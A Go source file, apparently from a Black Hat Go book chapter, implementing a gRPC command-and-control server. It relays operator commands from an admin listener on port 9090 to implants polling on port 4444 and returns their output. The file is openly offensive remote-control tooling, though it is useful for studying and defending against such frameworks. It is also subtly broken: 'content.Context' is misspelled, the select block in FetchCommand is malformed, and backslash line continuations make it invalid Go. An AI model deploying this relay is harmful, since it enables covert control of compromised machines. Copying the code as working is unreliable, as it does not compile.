package main

import (
	"context"
	"errors"
	"fmt"
	"log"
	"net"

	"github.com/blackhat-go/bhg/ch-14/grpcapi"
	"google.golang.org/grpc"
)

type implantServer struct {
	work, output chan *grpcapi.Command
}

type adminServer struct {
	work, output chan *grpcapi.Command
}

func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
	s := new(implantServer)
	s.work = work
	s.output = output
	return s
}

func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
	s := new(adminServer)
	s.work = work
	s.output = output
	return s
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) \
(*grpcapi.Command, error) {
	var cmd = new(grpcapi.Command)
	select {
		case cmd, ok := <-s.work:
			if ok {
				return cmd, nil
			}
			return cmd, errors.New("channel closed") // Implement retry
		// No work
		return cmd, nil
	}
}

func (s *adminServer) RunCommand(ctx content.Context, cmd *grpcapi.Command) \
(*grpcapi.Command, error) {
	var res *grpcapi.Command
	go func() {
		s.work <- cmd
	}()
	res = <-s.output
	return res, nil
}

func main() {
	var (
		implantListener, adminListener net.Listener
		err							   error
		opts						   []grpc.ServerOption
		work, output				   chan *grpcapi.Command
	)
	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
	implant := NewImplantServer(work, output)
	admin := NewAdminServer(work, output)
	if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 4444)); err != nil {
		log.Fatal(err) //Port may already be bound, or check priveliges...
	}
	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
		log.Fatal(err) //Port may already be bound, or check priveliges...
	}
	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
	go func() {
		grpcImplantServer.Serve(implantListener)
	}()
	grpcAdminServer.Serve(adminListener)
}
